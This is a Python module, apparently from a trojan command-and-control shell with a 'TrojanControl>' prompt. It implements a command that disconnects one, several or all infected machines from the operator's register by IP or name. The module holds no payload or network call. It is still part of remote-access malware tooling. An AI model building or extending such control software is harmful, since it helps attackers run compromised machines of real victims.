__author__ = 'Jonas'
from trojanshell import TrojanShell
from util import shellprint
from util import Message
from util import isip
from JTShell.util.error import ProcessError


def run(process, std="all", info=True):
    shell = process.shell
    disconnected_trojans = 0
    trojans_to_disconnect = []
    # only made for the convinience in the ide
    if isinstance(shell, TrojanShell):

        # disconnects all trojans of the currently used trojans within the trojan register in case they actually
        # are connected at the moment
        if std == "all":
            for trojanconnection in shell.trojanregister:
                trojans_to_disconnect.append(trojanconnection.ip)
        # disconnects the trojan with the given ip, after verifying, that it is connected
        elif isip(std):
            if std in shell.trojanregister.ip_dict.keys():
                trojans_to_disconnect.append(std)
            else:
                raise ProcessError("The Trojan with the ip '{0}' is not connected".format(std))
        # disconnects the trojan with the given name, after verifying, that it is connected
        else:
            if std in shell.trojanregister.name_dict.keys():
                trojans_to_disconnect.append(shell.trojanregister[std].ip)
            else:
                raise ProcessError("The Trojan with the name '{0}' is not connected".format(std))

        # actually disconnects all the trojans with the given ips within the lsit "trojans_to_disconnect"
        for ip in trojans_to_disconnect:
            shell.trojanregister.remove(ip)
            if info is True:
                shellprint(process, Message("process", "disconnected Trojan with the ip {0}".format(ip)))
            disconnected_trojans += 1
        shell.prompt = "\n TrojanControl> "
        return "{0} trojans finally disconnected".format(disconnected_trojans)



